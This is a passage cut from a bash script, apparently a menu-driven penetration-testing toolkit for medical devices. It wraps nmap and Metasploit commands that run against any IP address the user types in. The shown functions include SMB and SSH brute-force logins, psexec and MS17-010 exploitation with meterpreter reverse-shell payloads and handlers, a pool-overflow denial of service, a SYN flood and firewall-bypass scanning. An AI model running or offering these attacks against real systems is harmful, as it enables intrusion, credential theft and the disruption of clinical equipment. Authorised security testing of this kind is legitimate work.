			t050 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/050.txt" ;;
		051)
			clear
			t051 | tee "/root/Documents/OSSEC-MedDevice-PenTest/Individual-Tests/051.txt" ;;
		*)
			clear
			echo "Invalid task ID."
			echo
			echo
			taskMenu
	esac
}
function taskChoice2 {
	case $taskID in
		0)
			exit ;;
		1)
			clear
			header
			mode ;;
		*)
			taskChoice
	esac
}
function t001 {
	echo "001 - Ping targeted service"
	echo -e "Enter target's IP address: "
	read targetIP
	while ! ping -c3 $targetIP
		do
			echo "Target is unreachable."
			echo -e "Try again [Y/N]? "
			read yesNo
				case $yesNo in
					Y)
					clear
					001 ;;
					N)
					clear
					taskList ;;
					*)
					clear
					echo "Invalid input."
					001
				esac
		done
	echo
	echo "Target reached!"
	echo
	taskMenu
}
function t002 {
	echo "002 - Gather information passively using non-authorized user role"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Note: Scan might take more than 5 hours to complete."
	echo -e "Continue [Y/N]? "
	read yesNo
	case $yesNo in
		Y)
			echo
			echo -e "Target's IP address: "
			read targetIP
			echo
			nmap -T2 -sS -p7,13,17,19,20,21,23,25,42,53,80,88,102,110,119,135,139,389,443,445,464,515,548,554,563,593,636,647,1024-5000,6600,8080,9389,42424,49152-65535 --script firewall-bypass --script-args firewall-bypass.helper="ftp" $targetIP
			echo
			taskMenu ;;
		N)
			clear
			taskList ;;
		*)
			echo
			echo "Invalid input."
			echo
			echo
			002
	esac
	echo
	##taskMenu
}
function t003 {
	echo "003 - Assess possible ICS (Internet Connection Sharing) vulnerabilities"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Note: Scan might take more than 5 hours to complete."
	echo -e "Continue [Y/N]? "
	read yesNo
	case $yesNo in
		Y)
			echo
			echo -e "Target's IP address: "
			read targetIP
			echo
			nmap -vv -Pn -sT  --scan-delay 2s --max-parallelism 1 -ttl 255 -p20-25,80,102,137-139,443-445,502,530,593,789,1024-5000,8080,9600,19999,20000,20547,34962-34964,34980,42424,44818,46823,46824 $targetIP
			echo
			taskMenu ;;
		N)
			clear
			taskList ;;
		*)
			echo
			echo "Invalid input."
			echo
			echo
			003
	esac
	echo
	## taskMenu
}
function t004 {
	echo "004 - Perform UDP scan"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Note: Scan might take more than 5 hours to complete."
	echo -e "Continue [Y/N]? "
	read yesNo
	case $yesNo in
		Y)
			echo
			echo -e "Target's IP address: "
			read targetIP
			echo
			nmap -T2 -sU -p7,9,13,17,19,42,53,67,69,88,123,137,138,161,162,389,464,500,1645,1646,1701,1745,1755,1801,1812,1813,1900,2460,2535,3343,3527,4500,5004,5005,49152-65535 --script firewall-bypass --script-args firewall-bypass.helper="ftp" $targetIP
			echo
			taskMenu ;;
		N)
			clear
			taskList ;;
		*)
			echo
			echo "Invalid input."
			echo
			echo
			004
	esac
	echo
	##taskMenu
}
function t005 {
	echo "005- Assess possible ICS (Internet Connection Sharing) vulnerabilities on low-medium UDP ports"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Note: Scan might take more than 5 hours to complete."
	echo -e "Continue [Y/N]? "
	read yesNo
	case $yesNo in
		Y)
			echo
			echo -e "Target's IP address: "
			read targetIP
			echo
			nmap -vv -Pn -sU --scan-delay 2s --max-parallelism 1 -ttl 255 -p20-25,80,102,137-139,443-445,502,530,593,789,1024-5000,8080,9600,19999,20000,20547,34962-34964,34980,44818,46823,46824 $targetIP
			echo
			taskMenu ;;
		N)
			clear
			taskList ;;
		*)
			echo
			echo "Invalid input."
			echo
			echo
			005
	esac
	echo
	##taskMenu
}
function t006 {
	echo "006 - Check if device has MS12-008 and MS10-073 vulnerabilities"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap -vvv -O --osscan-guess -sV $targetIP
	echo
	taskMenu
}
function t007 {
	echo "007- Gather information actively using non-authorized user role"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's MAC address: "
	read targetMAC
	ip-mac
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -vvv -sT --source-port 20-25,53,80,135-139,443,445,515,2103-2107,8080,49155 --data-length 40 --spoof-mac $targetMAC -Pn $targetIP
	echo
	echo
	taskMenu
}
function t008 {
	echo "008 - Reterieve NetBIOS name from device"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/scanner/netbios/nbname" -x "set RHOSTS $targetIP"  -x "set THREADS 11" -x "set VERBOSE true" -x "run" -x "exit"
	echo
	taskMenu
}
function t009 {
	echo "009 - List supported protocols of device's SMB server"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap -p135,137,139,445 --script smb-protocols --script-args unsafe=1 $targetIP
	echo
	taskMenu
}
function t010 {
	echo "010 - Check if device is vulnerable to MS10-096, MS10-074, MS16-075, CVE-2017-8543 & CVE-2017-8589 attacks."
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap --script smb-os-discovery -p135,137,139,445 $targetIP
	echo
	taskMenu
}
function t011 {
	echo "011 - Check SMB message signing configuration"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap --script smb-security-mode --script-args unsafe=1 -p135-139,445 $targetIP
	echo
	taskMenu
}
function t012 {
	echo "012 - Enumerate Windows user accounts using SAMR"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap -vv -sU -p137-139,445 --script smb-enum-users --script-args samronly=true $targetIP
	echo
	taskMenu
}
function t013 {
	echo "013 - Enumerate Windows user accounts using LSA"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap -vvvv -sU -p135,137,139,445 --script smb-enum-users --script-args lsaonly=true $targetIP
	echo
	taskMenu
}
function t014 {
	echo "014 - Enumerate SMB sessions"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo "Enumerating SMB sessions via TCP ports . . ."
	echo
	nmap -vv -p135,137,139,445 --script smb-enum-sessions $targetIP
	echo
	echo "------------------------------"
	echo
	echo "Enumerating SMB sessions via UDP ports . . ."
	echo
	nmap -vv -sU -p135,137,139,445 --script smb-enum-sessions $targetIP
	echo
	taskMenu
}
function t015 {
	echo "015 - Enumerate SMB shares"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's SMB username: "
	read smbUser
	ip-smbU
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/scanner/smb/smb_enumshares" -x "set RHOSTS $targetIP" -x "set SMBName $smbUser" -x "set RPORT 455" -x "run" -x "exit"
	echo
	taskMenu
}
function t016 {
	echo "016 - Attempt bruteforce attack through SSH client"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	defaultUser
	echo
	defaultPass
	ip-users-pass
	echo "-----------------------------------------------------------------------------------------------------------"
	echo  "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login" -x "set RHOSTS $targetIP" -x "set RPORT 22" -x "set THREADS 11" -x "set BRUTEFORCE SPEED 1" -x "set STOP_ON_SUCCESS true" -x "set VERBOSE true" -x "set USER_FILE $userFile" -x "set BLANK_PASSWORDS true" -x "run" -x "set BLANK_PASSWORDS false" -x "set PASS_FILE $passFile" -x "run" -x "exit"
	echo
	taskMenu
}
function t017 {
	echo "017 - Bruteforce attack shared folders using anonymous credentials"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo "Bruteforcing shared folders via TCP ports . . ."
	echo
	nmap -vv -p137-139,445 --script smb-enum-shares $targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	echo
	echo "Bruteforcing shared folders via UDP ports . . ."
	echo 
	nmap -vv -sU -p137-139,445 --script smb-enum-shares $targetIP
	echo
	taskMenu
}
function t018 {
	echo "018 - Bruteforce attack shared folders using authorized credentials"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's SMB username: "
	read smbUser
	echo
	ip-smbU
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Bruteforcing shared folders via TCP ports . . ."
	echo
	nmap -vv -p137-139,445 --script smb-enum-shares --script-args smbuser=$smbUser $targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	echo
	echo "Bruteforcing shared folders via UDP ports"
	echo
	nmap -vv -sU -p137-139,445 --script smb-enum-shares --script-args smbuser=$smbUser $targetIP
	echo
	taskMenu
}
function t019 {
	echo "019 - Bruteforce shared users using SMB brute script"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap -p135,137,139,445 --script smb-brute,smb-enum-users $targetIP
	echo
	taskMenu
}
function t020 {
	echo "020 - Bruteforce shares using SMB brute script"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap -p135,137,139,445 --script smb-brute,smb-enum-shares $targetIP
	echo
	taskMenu
}
function t021 {
	echo "021 - Bruteforce SMB login protocol"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's SMB domain: "
	read smbDomain
	echo
	echo -e "Target's SMB username: "
	read smbUser
	echo
	defaultUser
	echo
	defaultPass
	ip-smbD-smbU-users-pass
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/scanner/smb/smb_login" -x "set BLANK_PASSWORDS true" -x "set BRUTEFORCE_SPEED 3" -x "set DETECT_ANY_AUTH true" -x "set PRESERVE_DOMAINS true" -x "set RHOSTS $targetIP" -x "set RPORT 445" -x "set SMBDomain $smbDomain" -x "set SMBUser smbUser" -x "run" -x "set BLANK_PASSWORDS false" -x "set USER_AS_PASS true" -x "run" -x "set USER_AS_PASS false" -x "set USER_FILE $userFile" -x "set PASS_FILE $passFile" -x "run" -x "exit"
	echo
	taskMenu
}
function t022 {
	echo "022 - Check possible remote login and execution"
	echo "      by bruteforcing SMB login using dictionaries"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	defaultUser
	echo
	defaultPass
	ip-users-pass
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -p137-139,445 --script smb-brute --script-args userdb=$userFile,passdb=$passFile $targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t023 {
	echo "023 - Set up windows/meterpreter/reverse_tcp payload"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use payload/windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t024 {
	echo "024 - Set up windows/shell_reverse_tcp payload"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use payload/windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t025 {
	echo "025 - Set up windows/x64/meterpreter_reverse_tcp payload to use for exploits"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use payload/windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t026 {
	echo "026 - Set up generic/shell_reverse_tcp payload to use for exploits"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use payload/generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 20" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t027 {
	echo "027 - Attempt to login to SMB by using psexec utility"
	echo "      of currently valid logged in administrator credentials"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's SHARE file name: "
	read share
	echo
	echo -e "Target's SMB domain: "
	read smbDomain
	echo
	echo -e "Target's SMB username: "
	read smbUser
	ipT-ip-share-smbD-smbU
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/windows/smb/psexec" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SHARE $share" -x "set SMBDomain $smbDomain" -x "back" -x "use payload/windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "back" -x "use exploit/windows/smb/psexec" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "exploit" -x "set SMBUser $smbUser" -x "exploit" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t028 {
	echo "028 - Check vulnerability MS15-034"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump" -x "set RHOSTS $targetIP" -x "set RPORT 445" -x "set THREADS 11" -x "set SSL true" -x "set VERBOSE true" -x "run" -x "exit"
	
}
function t029 {
	echo "029 - Check SMB vulnerability MS10-054"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap --script smb-vuln-ms10-054 -p137-139,445 $targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t030 {
	echo "030 - Perform Denial of Service on SMB vulnerability MS10-054"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's SHARE file name: "
	read share
	ipT-ip-share
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow" -x "set CHOST $testerIP" -x "set CPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SMBSHARE $share" -x "set VERBOSE true" -x "exploit" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t031 {
	echo "031 - Check SMB vulnerability MS10-061"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap --script smb-vuln-ms10-061 --script-args unsafe=1 -p135,139,445,515,2103,2105,2107,49155 $targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t032 {
	echo "032 - Try to exploit SMB vulnerability MS10-061"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Printer Share name: "
	read printerName
	echo
	echo -e "Target's SMB version: "
	read smbVersion
	echo
	echo -e "Target's operating system: "
	read targetOS
	echo
	echo -e "Target's SMB username: "
	read smbUser
	echo
	echo -e "Target's SMB domain: "
	read smbDomain
	ip-pshare-smbV-os-smbU-smbD
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/windows/smb/ms10_061_spoolss" -x "set PNAME $printerName" -x "set RHOST $targetIP" -x "set RPORT 135" -x "set SMB::Native_LM $smbVersion" -x "set SMB::Native_OS targetOS" -x "set SMBUser $smbUser" -x "set SMBDomain $smbDomain" -x "set VERBOSE true" -x "exploit" -x "set RPORT 515" -x "exploit" -x "set RPORT 2103" -x "exploit" -x "set RPORT 2105" -x "exploit" -x "set RPORT 2107" -x "exploit" -x "set RPORT 49155" -x "exploit" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t033 {
	echo "033 - Check SMB vulnerability MS17-010"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	nmap -vv --script smb-vuln-ms17-010 --script-args unsafe=1 -p135-139,445 $targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t034 {
	echo "034 - Scan SMB vulnerability MS17-010 through auxiliary"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010" -x "set CHECK_PIPE true" -x "set RHOSTS $targetIP" -x "run" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t035 {
	echo "035 - Exploit SMB vulnerability MS17-010 through auxiliary"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo -e "Target's SMB version: "
	read smbVersion
	echo
	echo -e "Target's operating system"
	read targetOS
	echo
	echo -e "Target's SMB username: "
	read smbUser
	echo
	echo -e "Target's SMB domain: "
	read smbDomain
	ipT-ip-smbV-os-smbU-smbD
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/admin/smb/ms17_010_command" -x "set RHOSTS $targetIP" -x "set RPORT 445" -x "set COMMAND ADMIN" -x "set SMB::Native_LM $smbVersion" -x "set SMB::Native_OS $targetOS" -x "set SMBUser $smbUser" -x "set SMBDomain $smbDomain" -x "set VERBOSE true" -x "back" -x "use payload/windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "back" -x "use auxiliary/admin/smb/ms17_010_command" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "exploit" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t036 {
	echo "036 - Try exploiting possible SMB vulnerability MS17-010"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec" -x "set RHOST $targetIP" -x "set SHARE IPC$" -x "set DBGTRACE true" -x "back" -x "use payload/windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "back" -x "use exploit/windows/smb/ms17_010_psexec" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set VERBOSE true" -x "exploit" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t037 {
	echo "037 - Check RDP vulnerability MS-12-020"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -sT -sU -p T:3389,U:3389 --script rdp-enum-encryption $targetIP
	echo
	echo "Using unsafe mode:"
	echo "-----------------------------------------------------------------------------------------------------------"
	nmap -vv --script rdp-vuln-ms12-020 --script-args unsafe=1 -p T:3389,U:3389 $targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t038 {
	echo "038 - Scan RDP vulnerability MS12-020 through auxiliary"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check" -x "set RHOSTS $targetIP" -x "set VERBOSE true" -x "run" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t039 {
	echo "039 - Exploit possible RDP vulnerability MS12-020"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids" -x "set RHOST $targetIP" -x "back" -x "use payload/windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "back" -x "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set VERBOSE true" -x "run" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t040 {
	echo "040 - Perform SYN Flood DOS attack"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Target's IP address: "
	read targetIP
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use auxiliary/dos/tcp/synflood" -x "set RHOST $targetIP" -x "set RPORT 80" -x "set NUM 100000" -x "run" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t041 {
	echo "041 - Start payload handler windows/meterpreter/reverse_tcp to start a session"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t042 {
	echo "042 - Start payload handler windows/shell_reverse_tcp to start a session"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t043 {
	echo "043 - Start payload handler windows/x64/meterpreter_reverse_tcp to start a session"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t044 {
	echo "044 - Start payload handler generic/shell_reverse_tcp to start a session"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j"-x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "set payload generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 443" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 4" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t045 {
	echo "045 - List any active sessions opened by the handlers"
	echo "---------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j"-x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "set payload generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 443" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 4" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "sessions -i" -x "exit"
	echo
	echo "---------------------------------------------------------------------------"
	taskMenu
}
function t046 {
	echo "046 - Check if device has MS13-081 vulnerability"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j"-x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "set payload generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 443" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 4" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "use post/windows/gather/enum_patches" -x "set KB 2862335,2862330,2884256" -x "set SESSION 1" -x "run" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t047 {
	echo "047- Perform Blue Screen of Death (BSOD) exploit"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
